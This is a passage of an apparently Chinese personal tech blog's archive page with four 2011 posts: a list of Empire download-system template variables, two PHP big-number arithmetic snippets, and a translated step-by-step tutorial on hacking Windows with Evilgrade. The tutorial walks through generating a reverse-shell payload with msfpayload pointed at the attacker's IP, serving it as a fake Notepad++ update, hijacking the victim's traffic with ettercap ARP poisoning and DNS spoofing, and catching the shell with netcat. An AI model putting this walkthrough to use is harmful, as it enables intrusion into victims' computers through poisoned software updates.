<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Blog,L.N.,渗透测试,APT,代码审计,程序开发,网络安全,信息安全" />










<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/page/14/index.html">
<meta property="og:site_name" content="Hexo">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/14/"/>





  <title>Hexo</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hexo</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description"></h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Startseite
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archiv
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2011/12/04/帝国下载系统申明的变量整理/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2011/12/04/帝国下载系统申明的变量整理/" itemprop="url">帝国下载系统申明的变量整理</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2011-12-04T15:55:03+08:00">
                2011-12-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/技术文章/" itemprop="url" rel="index">
                    <span itemprop="name">技术文章</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>帝国模板变量：</p>
<p>站点地址：[!–edown.url–]</p>
<p>页面关键字：[!–pagekey–]</p>
<p>热门下载：[!–empiredown–]</p>
<p>分类名称：[!–class.name–]</p>
<p>页面链接： [!–softtime–]</p>
<p>文件扩展名：&nbsp; [!–filetype–]</p>
<p>软件版本： [!–soft_version–]</p>
<p>软件语言： [!–language–]</p>
<p>下载点数 ：[!–downfen–]</p>
<p>发布者： [!–adduser–]</p>
<p>总下载数 [!–count_all–]</p>
<p>日下载数：[!–count_day–]</p>
<p>关键字 ： [!–keyboard–]</p>
<p>实时显示下载数:&lt;script src=”[!–edown.url–]ViewClick?softid=[!–softid–]&amp;all=1&amp;month=1&amp;week=1&amp;day=1”&gt;&lt;/script&gt;</p>
<p>页面导航: [!–empiredown–]</p>
<p>页面简介：[!–pagedes–]</p>
<p>最新下载：[!–empiredown.newjs–]</p>
<p>分类ID: [!–class.id–]</p>
<p>页面标题 ：[!–pagetitle–]</p>
<p>父分类ID：[!–bclass.id–]</p>
<p>父分类名称：[!–bclass.name–]</p>
<p>软件名称：[!–softname–]</p>
<p>软件ID： [!–softid–]</p>
<p>所属专题：[!–ztname–]</p>
<p>软件简介：[!–softsay–]</p>
<p>文件大小：[!–filesize–]</p>
<p>预览图：[!–softpic–]</p>
<p>授权形式：[!–soft_sq–]</p>
<p>软件类型：[!–sifttype–]</p>
<p>下载地址：[!–downpath–]</p>
<p>在线观看地址：[!–onlinepath–]</p>
<p>下载级别：[!–foruser–]</p>
<p>软件等级： [!–star–]</p>
<p>作者：[!–writer–]</p>
<p>官方网站：[!–homepage–]</p>
<p>月下载数：[!–count_month–]</p>
<p>周下载数：[!–count_week–]</p>
<p>运行环境： [!–soft_fj–]</p>
<p>演示地址：[!–demo–]</p>
<p>相关链接：[!–otherlink–]</p>
<p>分类列表：[!–class.menu–]</p>
<p>&nbsp;</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2011/12/03/【翻译】在backtrack5上用Evilgrade工具15步入侵windows/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2011/12/03/【翻译】在backtrack5上用Evilgrade工具15步入侵windows/" itemprop="url">【翻译】在backtrack5上用Evilgrade工具15步入侵windows</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2011-12-03T11:41:49+08:00">
                2011-12-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/技术文章/" itemprop="url" rel="index">
                    <span itemprop="name">技术文章</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 这篇文章是我无意中看见的evligrade的一个利用教程，由于是英文的所以翻译给大家看看！感觉对大家的认识和提高都有很多的作用，其实漏洞无处不在！开拓我们的思维，才是关键！ 好了，废话不多说！(图裂了！我就不改了！就看原作者的吧！)</p>
<hr>
<p>此文摘自：<a href="http://vishnuvalentino.com/computer/15-step-to-hacking-windows-using-evilgrade-2-0-on-backtrack-5/" target="_blank" rel="noopener">http://vishnuvalentino.com/computer/15-step-to-hacking-windows-using-evilgrade-2-0-on-backtrack-5/</a></p>
<p>作者：Vishnu Valentino</p>
<p>翻译：L.N.</p>
<p>题目：在backtrack5上用Evilgrade工具15步入侵windows</p>
<p>文章类型：辅导类</p>
<p>难度：中高级</p>
<p>evilgrade简介：</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp; evilgrade是一个模块化的框架结构，使用者可以利用脆弱的软件的升级更新机制，来欺骗用户安装自己注入的其他程序（木马、病毒）。它提供了代理和默认快速配置，还有web服务和dns服务模块，可以很容易的更新设置，并且还可以自动配置新的代理！</p>
<p>来自：[<a href="http://www.infobytesec.com[/url](http://www.infobytesec.com[/url)" target="_blank" rel="noopener">http://www.infobytesec.com[/url](http://www.infobytesec.com[/url)</a></p>
<p>使用工具：</p>
<p>1. Evilgrade</p>
<p>2. Backtrack 5</p>
<p>步骤：</p>
<p>1.解压evilgrade然后运行它用下面的命令</p>
<p>&nbsp;</p>
<pre class="brush:shell; toolbar: true; auto-links: true;">tar xvfz isr-evilgrade-2.0.0.tar.gz

cd isr-evilgrade-2.0.0.tar.gz/

./evilgrade</pre> 

<p>如果你在使用evilgrade的时候出现了错误，你可以参考<a href="http://vishnuvalentino.com/tips-and-trick/evilgrade-2-0-error-on-backtrack-5-solved/" target="_blank" rel="noopener">http://vishnuvalentino.com/tips-and-trick/evilgrade-2-0-error-on-backtrack-5-solved/</a>这篇文章</p>
<p>下面显示的这个图片是你正确运行时的样子</p>
<p><img src="/blog/photo/content/evilgrade1[1].jpg?1322882381" alt="">&nbsp;</p>
<p>2.下一步你需要去确定一个应用的目标程序，因为evilgrade将创建一个假的更新注入到目标电脑。使用下面的命令查看可以支持应用的模块。</p>
<pre class="brush:shell; toolbar: true; auto-links: true;">evilgrade&gt;show modules</pre> 

<p>（命令是show modules，不要evilgrade&gt;也输入进去了，这个便是当前的目录）</p>
<pre class="brush:shell; toolbar: true; auto-links: true;">List of modules:
===============

allmynotes
amsn
appleupdate
apptapp
apt
atube
autoit3
bbappworld
blackberry
bsplayer
ccleaner
clamwin
cpan
cygwin
dap
divxsuite
express_talk
fcleaner
filezilla
flashget
flip4mac
freerip
getjar
gom
googleanalytics
growl
isopen
istat
itunes
jet
jetphoto
linkedin
miranda
mirc
nokia
nokiasoftware
notepadplus
openoffice
opera
orbit
osx
paintnet
panda_antirootkit
photoscape
quicktime
skype
sparkle
speedbit
sunbelt
sunjava
superantispyware
teamviewer
techtracker
trillian
ubertwitter
vidbox
virtualbox
vmware
winamp
winscp
winupdate
winzip
yahoomsn
- 63 modules available.</pre> 

<p>在这篇辅导文章中，我将使用的目标程序是notepad plus，因此当管理员不加思索的升级这个应用程序的时候，他讲掉进我的陷阱里面。使用这个模块，运行以下命令：</p>
<pre class="brush:shell; toolbar: true; auto-links: true;">evilgrade&gt;configure notepadplus</pre> 

<p>3.查看选项，你可以使用show options这个命令</p>
<p><img src="/blog/photo/content/evilgrade2[1].jpg?1322882382" alt=""></p>
<p>在上面的图片中，virtualhost是当管理员升级他的notepad plus时，就会打开这个url连接：notepad-plus.sourceforge.net。下面我们将使用到这个连接。</p>
<p>&nbsp;</p>
<p>4.接下来我们设置一个代理。我们配置一个代理用msfpayload创建一个shell_reverse_tcp</p>
<pre class="brush:shell; toolbar: true; auto-links: true;">evilgrade(notepadplus)&gt;set agent ’["/pentest/exploits/framework3/msfpayload windows/shell_reverse_tcp LHOST=192.168.8.91 LPORT=1234 X &gt; &lt;%OUT%&gt;/tmp/notepadplus.exe&lt;%OUT%&gt;"]’</pre> 

<p>解释：</p>
<p>/pentest/exploits/framework3/msfpayload ?&gt; 我们将加载这个msfpayload</p>
<p>windows/shell_reverse_tcp ?&gt; 当成功的时候我们就可以反弹一个shell回本地</p>
<p>LHOST ?&gt; localhost 你backtrack5的ip地址 / 攻击者的ip地址.</p>
<p>LPORT ?&gt; 填一个端口（用于监听） （相关的说明可以看<a href="http://www.infobytesec.com/down/isr-evilgrade-Readme.txt" target="_blank" rel="noopener">http://www.infobytesec.com/down/isr-evilgrade-Readme.txt</a>）</p>
<p>&nbsp;</p>
<p>5.下一步是我们打开evilgrade服务。确保你的80端口是打开的</p>
<p><img src="/blog/photo/content/evilgrade3[1].jpg?1322882383" alt=""></p>
<p>&nbsp;</p>
<p>6.完成了evilgrade得设置过后，我们还需要配置中间人攻击用ettercap，然后当当管理员升级notpad plus时就会直接连接evilgrade服务。第一步是你需要配置etter.dns</p>
<pre class="brush:shell; toolbar: true; auto-links: true;">pico /usr/share/ettercap/etter.dns</pre> 

<p>&nbsp;</p>
<p><img src="/blog/photo/content/evilgrade4[1].jpg?1322882384" alt=""></p>
<p>notepad-plus.sourceforge.net ?&gt; 这个地址是我们在第三步得到的</p>
<p>&nbsp;</p>
<p>7.接下来我们要用到ettercap</p>
<p>“ettercap是什么见<a href="http://ettercap.sourceforge.net/" target="_blank" rel="noopener">http://ettercap.sourceforge.net/</a>”</p>
<p>运行ettercap，打开新的terminal（ctrl+alt+t）运行下面的命令</p>
<pre class="brush:shell; toolbar: true; auto-links: true;">ettercap -G</pre> 

<p>Click Sniff ?&gt; Unified sniffing ?&gt; 选着你的网卡，在这儿我用eth0.</p>
<p><img src="/blog/photo/content/evilgrade5[1].jpg?1322882385" alt=""></p>
<p>&nbsp;</p>
<p>8.下一步我们需要使用dns_spoof插件，这个插件用于接收目标机器对evilgrade服务的请求。点击 Plugins ?&gt; Manage the plugins ?&gt; 双击 dns_spoof </p>
<p><img src="/blog/photo/content/evilgrade6[1].jpg?1322882386" alt=""></p>
<p>9.下一步是扫描主机，这部是我们去决定一个目标，点击Hosts ?&gt; Scan for </p>
<p><img src="/blog/photo/content/evilgrade8[1].jpg?1322882388" alt=""></p>
<p>10.下面是我们网络中得所有主机，我们需要建议一个目标</p>
<p><img src="/blog/photo/content/evilgrade9[1].jpg?1322882389" alt=""></p>
<p>11.我们还需要去完成中间者攻击去拦截网络中得数据，点击 Mitm ?&gt; Arp poisoning ?&gt; 点击 “Sniff remote connection”.</p>
<p><img src="/blog/photo/content/evilgrade7[1].jpg?1322882387" alt=""></p>
<p>&nbsp;</p>
<p>12.如果上面的每一步都设置正确，就运行ettercap开始嗅探start sniffing</p>
<p><img src="/blog/photo/content/evilgrade10[1].jpg?1322882391" alt=""></p>
<p>13.接下来我们用nc（netcat）去监听端口1234（这个端口就是我们上面设置的那个）</p>
<p>nc是什么我就不多说了不知道的见：From :<a href="http://netcat.sourceforge.net/" target="_blank" rel="noopener">http://netcat.sourceforge.net/</a></p>
<p>&nbsp;</p>
<p>新打开一个terminal（ctrl+alt+t）并且运行命令</p>
<pre class="brush:shell; toolbar: true; auto-links: true;">nc -l -v -p 1234</pre> 

<p>14.当管理员打开notepad plus时就会被要求升级更新，如下面的图，如果管理员点击yes，就成功了</p>
<p><img src="/blog/photo/content/evilgrade11[1].jpg?1322882392" alt=""></p>
<p>15.我们的nc就会有东西回显了，因为当管理员点击yes升级完成的时候，我们反弹的shell就成功了</p>
<p><img src="/blog/photo/content/evilgrade12[1].jpg?1322882393" alt=""></p>
<p>应对方法：</p>
<p>1.直接到官方网站下载最新版本的程序</p>
<p>2.保持反病毒程序是最新的</p>
<p>希望对你有帮助</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2011/11/09/大数减法php代码/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2011/11/09/大数减法php代码/" itemprop="url">大数减法php代码</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2011-11-09T12:03:21+08:00">
                2011-11-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP-MYSQL学习/" itemprop="url" rel="index">
                    <span itemprop="name">PHP|MYSQL学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <div>前几天学的是php的大数加法代码，今天写的是大数 减法代码，过几天再试试大数乘法代码和除法代码！</div><br><div>——————————————————————————————————————————————-</div><br><div>&lt;?php &nbsp;</div><br><div>$big1 = ’999999999999999999999999999999999999999999999’; &nbsp;</div><br><div>$big2 = ’99999999999999999999999999’; &nbsp;</div><br><div>echo strsub($big1,$big2).”&lt;br/&gt;”; &nbsp;&nbsp;</div><br><div>function strsub($str1,$str2){ &nbsp;</div><br><div>&nbsp; &nbsp; $res = array();</div><br><div>&nbsp; &nbsp; $strd= true;</div><br><div>//字符串长度处理</div><br><div>&nbsp; &nbsp; if(strlen($str1) &gt; strlen($str2)){ &nbsp;</div><br><div>&nbsp; &nbsp; &nbsp; &nbsp; $str2 = str_pad($str2,strlen($str1),’0’,STR_PAD_LEFT);&nbsp;</div><br><div>$strd=true;</div><br><div>&nbsp; &nbsp; } &nbsp;</div><br><div>&nbsp; &nbsp; elseif(strlen($str1) == strlen($str2)){</div><br><div>for($i=0;$i&lt;strlen($str1);$i++){</div><br><div>if($str1[$i] &gt; $str2[$i]){</div><br><div>$strb=true;&nbsp;</div><br><div>break;</div><br><div>}</div><br><div>if($str2[$i] &gt; $str1[$i]){</div><br><div>$strb=false;&nbsp;</div><br><div>break;</div><br><div>}</div><br><div>}</div><br><div>}</div><br><div></div><br><div>else{ &nbsp;</div><br><div>&nbsp; &nbsp; &nbsp; &nbsp; $str1 = str_pad($str1,strlen($str2),’0’,STR_PAD_LEFT);</div><br><div>$strd=false;</div><br><div>&nbsp; &nbsp; } &nbsp;</div><br><div>//数组元素循环相减和进位处理</div><br><div>&nbsp; &nbsp; for($i =strlen($str1)-1 ,$res[$i]=0; $i&gt;=0; $i–){ &nbsp;</div><br><div>&nbsp; &nbsp; &nbsp; &nbsp; $strd?($tmp = $str1[$i] - $str2[$i]):($tmp = $str2[$i] - $str1[$i]); &nbsp;</div><br><div>&nbsp; &nbsp; &nbsp; &nbsp; $res[$i] += $tmp;</div><br><div>if($i!==0){</div><br><div>if($res[$i] &lt; 0 ) {</div><br><div>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $res[$i] += 10;</div><br><div>$res[$i-1]=0;</div><br><div>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $res[$i-1] -= 1;</div><br><div>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</div><br><div>&nbsp;else{</div><br><div>$res[$i-1]=0;</div><br><div>&nbsp;}</div><br><div>}</div><br><div>&nbsp; &nbsp; } &nbsp;</div><br><div>&nbsp; &nbsp; ksort($res);//按键名从低到高进行排列 &nbsp;</div><br><div>&nbsp; &nbsp;($strd or implode(’’,$res)==0)?$res = implode(’’,$res):$res=”-“ . implode(’’,$res); //数组转换成字符串&nbsp;</div><br><div>&nbsp; &nbsp; return $res; &nbsp;</div><br><div>} &nbsp;</div><br><div>?&gt;</div>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2011/11/08/php大数加法代码修改/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2011/11/08/php大数加法代码修改/" itemprop="url">php大数加法代码修改</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2011-11-08T10:33:47+08:00">
                2011-11-08
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP-MYSQL学习/" itemprop="url" rel="index">
                    <span itemprop="name">PHP|MYSQL学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&nbsp; &nbsp; &nbsp;前段时间百度大数加法php代码没有百度到，今天一试竟然有了，发现了段，两段或多或少都有写小瑕疵！虽然不影响结果，但是为了奉行没有最好只有更好的理念！我对他进行了小的改动！</p>
<hr>
<p>第一段</p>
<p>转至：<a href="http://blog.csdn.net/youngerchen/article/details/6103595" target="_blank" rel="noopener">http://blog.csdn.net/youngerchen/article/details/6103595</a></p>
<p>&nbsp;</p>
<p>&lt;?php &nbsp;<br><br>$big1 = ’2036465424168354343213213213213213324654654’; &nbsp;<br><br>$big2 = ’654657861324184354135435654165432165131321321321651351351351351351351351351351’; &nbsp;<br><br>echo strAdd($big1,$big2); &nbsp;<br><br>&nbsp;&nbsp;<br><br>function strAdd($str1,$str2){ &nbsp;<br><br>&nbsp; &nbsp; $res = array(); &nbsp;<br><br>&nbsp; &nbsp; if(strlen($str1) &gt; strlen($str2)){ &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $str2 = str_pad($str2,strlen($str1),’0’,STR_PAD_LEFT); &nbsp;<br><br>&nbsp; &nbsp; } &nbsp;<br><br>&nbsp; &nbsp; else{ &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $str1 = str_pad($str1,strlen($str2),’0’,STR_PAD_LEFT); &nbsp;<br><br>&nbsp; &nbsp; } &nbsp;<br><br>&nbsp; &nbsp; for($i = strlen($str1)-1; $i&gt;=0; $i–){ &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $tmp = $str1[$i] + $str2[$i]; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $res[$i] += $tmp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; if($res[$i] &gt;= 10) { &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $res[$i] -= 10; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $res[$i-1] += 1; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; } &nbsp;<br><br>&nbsp; &nbsp; } &nbsp;<br><br>&nbsp; &nbsp; ksort($res); &nbsp;<br><br>&nbsp; &nbsp; $res = implode(’’,$res); &nbsp;<br><br>&nbsp; &nbsp; return $res; &nbsp;<br><br>} &nbsp;<br><br>?&gt; &nbsp;<br><br>———————————————<br><br>因为他没有对数组赋初值就进行相加处理，所以会有警告出现！<br><br>改动版：<br><br>&nbsp;<br><br></p><p>&lt;?php &nbsp;<br><br>$big1 = ’9999999999999999999999999999999999999’;<br><br></p>

<p>$big2 = ’999999999999999999999999999999999999999’; &nbsp;<br><br>echo strAdd($big1,$big2).”&lt;br/&gt;”; &nbsp;<br><br>&nbsp;&nbsp;<br><br>function strAdd($str1,$str2){ &nbsp;<br><br>&nbsp; &nbsp; $res = array();<br><br><span class="Apple-tab-span" style="white-space:pre;">    </span>//字符串长度处理<br><br>&nbsp; &nbsp; if(strlen($str1) &gt; strlen($str2)){ &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $str2 = str_pad($str2,strlen($str1),’0’,STR_PAD_LEFT);&nbsp;<br><br><span class="Apple-tab-span" style="white-space:pre;">        </span>//string str_pad ( string $input , int $pad_length [, string $pad_string = “ “ [, int $pad_type = STR_PAD_RIGHT ]] )&nbsp;<br><br>&nbsp; &nbsp; } &nbsp;<br><br>&nbsp; &nbsp; else{ &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $str1 = str_pad($str1,strlen($str2),’0’,STR_PAD_LEFT); &nbsp;<br><br>&nbsp; &nbsp; } &nbsp;<br><br><span class="Apple-tab-span" style="white-space:pre;">    </span>//数组元素循环相加和进位处理<br><br>&nbsp; &nbsp; for($i = strlen($str1)-1,$res[$i]=0; $i&gt;=0; $i–){ &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $tmp = $str1[$i] + $str2[$i]; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $res[$i] += $tmp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; if($res[$i] &gt;= 10) { &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $res[$i] -= 10;<br><br><span class="Apple-tab-span" style="white-space:pre;">            </span>$res[$i-1]=0;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $res[$i-1] += 1; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; }<br><br><span class="Apple-tab-span" style="white-space:pre;">        </span>else{<br><br><span class="Apple-tab-span" style="white-space:pre;">            </span>$res[$i-1]=0;<br><br><span class="Apple-tab-span" style="white-space:pre;">        </span>}<br><br>&nbsp; &nbsp; } &nbsp;<br><br>&nbsp; &nbsp; ksort($res);//按键名从低到高进行排列 &nbsp;<br><br>&nbsp; &nbsp; $res[-1]==0?$res=substr(implode(’’,$res),1):$res = implode(’’,$res); //数组转换成字符串&nbsp;<br><br>&nbsp; &nbsp; return $res; &nbsp;<br><br>} &nbsp;<br><br>?&gt;<br><br></p>

<p>&nbsp;</p>
<p></p><p></p>
<p>&nbsp;</p>
<!--EndFragment-->
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2011/11/03/大数加法计算php代码/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2011/11/03/大数加法计算php代码/" itemprop="url">大数加法计算php代码</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2011-11-03T17:22:00+08:00">
                2011-11-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
